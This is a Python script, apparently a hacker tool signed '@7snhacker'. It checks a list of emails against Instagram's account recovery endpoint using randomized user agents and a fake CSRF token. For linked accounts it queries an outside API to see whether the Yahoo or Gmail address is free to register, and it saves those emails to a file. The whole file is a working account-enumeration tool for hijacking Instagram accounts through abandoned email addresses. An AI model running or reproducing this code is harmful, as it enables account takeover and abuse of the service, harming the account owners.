import requests
import time
from user_agent import generate_user_agent
lst = open("email.txt","r")
print("""
    ███████╗███╗   ███╗ █████╗ ██╗██╗      ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗
    ██╔════╝████╗ ████║██╔══██╗██║██║     ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝
    █████╗  ██╔████╔██║███████║██║██║     ██║     ███████║█████╗  ██║     █████╔╝ 
    ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ 
    ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗╚██████╗██║  ██║███████╗╚██████╗██║  ██╗
    ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝
by @7snhacker""")
print("instagram version")
print("")
print("click Ctrl Z to stop")
sleep = float(input("sleep : "))
while True:
    reads = lst.readline().split('\n')[0]
    time.sleep(sleep)
    req = requests.session()
    link = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
    req.headers = {'user-agent': generate_user_agent()}
    req.headers.update({'X-CSRFToken': "missing"})
    data = {"email_or_username":reads}
    r = req.post(link,data=data)
    if ("We sent an") in r.text:
        rz = requests.get(f'https://emailsverified-django.herokuapp.com/api/yahoo/?username={reads.replace("@yahoo.com","")}').text
        rg = requests.get(f'https://emailsverified-django.herokuapp.com/api/gmail/?username={reads.replace("@gmail.com","")}').text
        if "taken" in rz:
            print(f"{reads} : Linked : Taken[!]")
        elif "available" in rz:
            print(f"{reads} : Linked : Available[*]")
            with open("Linked.txt", "a") as Linked:
                Linked.write(reads + "\n")
        elif "available" in rg:
            print(f"{reads} : Linked : Available[*]")
            with open("Linked.txt", "a") as Linked:
                Linked.write(reads + "\n")
        elif "taken" in rg:
            print(f"{reads} : Linked : Taken[!]")
        else:
            print(f"{reads} : Linked : Unknown[*]")
    elif ("Please wait a few minutes before you try again.") in r.text:
        print("Please wait a few minutes")
        time.sleep(3)
        print("You Send Many Requests")
    else:
        print(f"UnLinked : {reads}")








